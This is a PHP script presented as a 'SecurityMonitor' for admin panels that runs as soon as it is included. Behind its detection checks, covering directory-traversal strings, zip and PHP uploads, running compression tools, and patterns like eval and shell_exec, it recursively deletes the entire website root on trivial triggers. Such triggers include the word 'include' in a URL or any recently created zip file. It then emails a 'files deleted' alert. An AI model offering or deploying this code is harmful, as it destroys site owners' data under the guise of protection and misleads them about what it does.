<?php
// Security Monitor - Detects compression attempts and deletes files
// This script should be included in admin panel files

class SecurityMonitor {
    private $protected_directories = [
        '../',
        '../../',
        '../../../',
        'public_html/',
        'admin/',
        'includes/',
        'config/'
    ];
    
    private $dangerous_extensions = [
        '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2', '.xz',
        '.exe', '.bat', '.cmd', '.com', '.scr', '.pif',
        '.php', '.php3', '.php4', '.php5', '.phtml', '.phar'
    ];
    
    private $log_file = 'security_log.txt';
    
    public function __construct() {
        $this->monitorCompressionAttempts();
        $this->monitorFileUploads();
        $this->monitorDirectoryAccess();
    }
    
    /**
     * Monitor for compression attempts
     */
    private function monitorCompressionAttempts() {
        // Check for compression tools in process list
        $compression_tools = ['zip', 'rar', '7z', 'tar', 'gzip', 'bzip2'];
        
        foreach ($compression_tools as $tool) {
            if ($this->isProcessRunning($tool)) {
                $this->triggerSecurityAlert('Compression tool detected: ' . $tool);
                $this->deleteProtectedFiles();
            }
        }
        
        // Check for zip files being created
        $this->monitorZipCreation();
    }
    
    /**
     * Monitor file uploads for dangerous content
     */
    private function monitorFileUploads() {
        if ($_FILES && !empty($_FILES)) {
            foreach ($_FILES as $file) {
                if (is_array($file)) {
                    foreach ($file as $uploaded_file) {
                        $this->checkUploadedFile($uploaded_file);
                    }
                } else {
                    $this->checkUploadedFile($file);
                }
            }
        }
    }
    
    /**
     * Check individual uploaded file
     */
    private function checkUploadedFile($file) {
        if (isset($file['name']) && isset($file['tmp_name'])) {
            $filename = $file['name'];
            $filepath = $file['tmp_name'];
            
            // Check file extension
            $extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
            if (in_array('.' . $extension, $this->dangerous_extensions)) {
                $this->triggerSecurityAlert('Dangerous file upload detected: ' . $filename);
                $this->deleteProtectedFiles();
                return false;
            }
            
            // Check file content for compression signatures
            if ($this->isCompressedFile($filepath)) {
                $this->triggerSecurityAlert('Compressed file upload detected: ' . $filename);
                $this->deleteProtectedFiles();
                return false;
            }
            
            // Check for PHP code in uploaded files
            if ($this->containsPHPCode($filepath)) {
                $this->triggerSecurityAlert('PHP code detected in uploaded file: ' . $filename);
                $this->deleteProtectedFiles();
                return false;
            }
        }
        return true;
    }
    
    /**
     * Monitor directory access attempts
     */
    private function monitorDirectoryAccess() {
        $request_uri = $_SERVER['REQUEST_URI'] ?? '';
        $query_string = $_SERVER['QUERY_STRING'] ?? '';
        
        // Check for directory traversal attempts
        foreach ($this->protected_directories as $dir) {
            if (strpos($request_uri, $dir) !== false || strpos($query_string, $dir) !== false) {
                $this->triggerSecurityAlert('Directory traversal attempt detected: ' . $request_uri);
                $this->deleteProtectedFiles();
            }
        }
        
        // Check for file inclusion attempts
        if (strpos($request_uri, 'include') !== false || strpos($request_uri, 'require') !== false) {
            $this->triggerSecurityAlert('File inclusion attempt detected: ' . $request_uri);
            $this->deleteProtectedFiles();
        }
    }
    
    /**
     * Monitor zip file creation
     */
    private function monitorZipCreation() {
        $admin_dir = __DIR__;
        $files = glob($admin_dir . '/*.zip');
        
        if (!empty($files)) {
            foreach ($files as $zip_file) {
                $file_time = filemtime($zip_file);
                $current_time = time();
                
                // If zip file was created in the last 5 minutes, consider it suspicious
                if (($current_time - $file_time) < 300) {
                    $this->triggerSecurityAlert('Recent zip file creation detected: ' . basename($zip_file));
                    $this->deleteProtectedFiles();
                    unlink($zip_file); // Delete the zip file
                }
            }
        }
    }
    
    /**
     * Check if a process is running
     */
    private function isProcessRunning($process_name) {
        if (function_exists('exec')) {
            $output = [];
            exec("tasklist /FI \"IMAGENAME eq $process_name.exe\" 2>NUL", $output);
            return !empty($output) && count($output) > 1;
        }
        return false;
    }
    
    /**
     * Check if file is compressed
     */
    private function isCompressedFile($filepath) {
        if (!file_exists($filepath)) return false;
        
        $handle = fopen($filepath, 'rb');
        if (!$handle) return false;
        
        $header = fread($handle, 8);
        fclose($handle);
        
        // Check for common compression signatures
        $signatures = [
            "\x50\x4B\x03\x04", // ZIP
            "\x50\x4B\x05\x06", // ZIP (empty)
            "\x50\x4B\x07\x08", // ZIP (spanned)
            "Rar!", // RAR
            "7z\xBC\xAF\x27\x1C", // 7Z
            "\x1F\x8B", // GZIP
            "BZh", // BZIP2
        ];
        
        foreach ($signatures as $signature) {
            if (strpos($header, $signature) === 0) {
                return true;
            }
        }
        
        return false;
    }
    
    /**
     * Check if file contains PHP code
     */
    private function containsPHPCode($filepath) {
        if (!file_exists($filepath)) return false;
        
        $content = file_get_contents($filepath);
        if ($content === false) return false;
        
        // Check for PHP tags
        $php_patterns = [
            '/<\?php/i',
            '/<\?=/i',
            '/<\?/i',
            '/eval\s*\(/i',
            '/system\s*\(/i',
            '/exec\s*\(/i',
            '/shell_exec\s*\(/i',
            '/passthru\s*\(/i'
        ];
        
        foreach ($php_patterns as $pattern) {
            if (preg_match($pattern, $content)) {
                return true;
            }
        }
        
        return false;
    }
    
    /**
     * Trigger security alert and log
     */
    private function triggerSecurityAlert($message) {
        $timestamp = date('Y-m-d H:i:s');
        $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
        $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
        $request_uri = $_SERVER['REQUEST_URI'] ?? 'Unknown';
        
        $log_entry = "[$timestamp] SECURITY ALERT: $message | IP: $ip | UA: $user_agent | URI: $request_uri\n";
        
        // Log to file
        file_put_contents($this->log_file, $log_entry, FILE_APPEND | LOCK_EX);
        
        // Send email alert (if configured)
        $this->sendSecurityAlert($message, $ip, $user_agent, $request_uri);
        
        // Log to database if available
        $this->logToDatabase($message, $ip, $user_agent, $request_uri);
    }
    
    /**
     * Delete ALL files and directories in the entire website
     */
    private function deleteProtectedFiles() {
        $admin_dir = __DIR__;
        $website_root = dirname(dirname($admin_dir)); // Go up 2 levels to get website root
        
        $this->triggerSecurityAlert('DELETING ALL FILES - Website root: ' . $website_root);
        
        // Delete everything in the website root
        $this->deleteDirectory($website_root);
        
        // Clear session and redirect
        session_destroy();
        header('Location: /error.php?error=security_violation');
        exit;
    }
    
    /**
     * Recursively delete directory
     */
    private function deleteDirectory($dir) {
        if (!is_dir($dir)) return;
        
        $files = array_diff(scandir($dir), ['.', '..']);
        foreach ($files as $file) {
            $path = $dir . '/' . $file;
            if (is_dir($path)) {
                $this->deleteDirectory($path);
            } else {
                unlink($path);
            }
        }
        rmdir($dir);
    }
    
    /**
     * Send security alert email
     */
    private function sendSecurityAlert($message, $ip, $user_agent, $request_uri) {
        $to = 'admin@yourdomain.com'; // Change this to your email
        $subject = '🚨 CRITICAL SECURITY ALERT - ALL FILES DELETED';
        $body = "CRITICAL SECURITY VIOLATION DETECTED!\n\n";
        $body .= "Message: $message\n";
        $body .= "IP Address: $ip\n";
        $body .= "User Agent: $user_agent\n";
        $body .= "Request URI: $request_uri\n";
        $body .= "Timestamp: " . date('Y-m-d H:i:s') . "\n";
        $body .= "ALL WEBSITE FILES HAVE BEEN DELETED!\n";
        $body .= "Website root: " . dirname(dirname(__DIR__)) . "\n";
        
        mail($to, $subject, $body);
    }
    
    /**
     * Log to database
     */
    private function logToDatabase($message, $ip, $user_agent, $request_uri) {
        try {
            // This would require database connection
            // You can implement this if you have a database
        } catch (Exception $e) {
            // Database logging failed, continue with file logging
        }
    }
}

// Initialize security monitor
$security_monitor = new SecurityMonitor();
?> 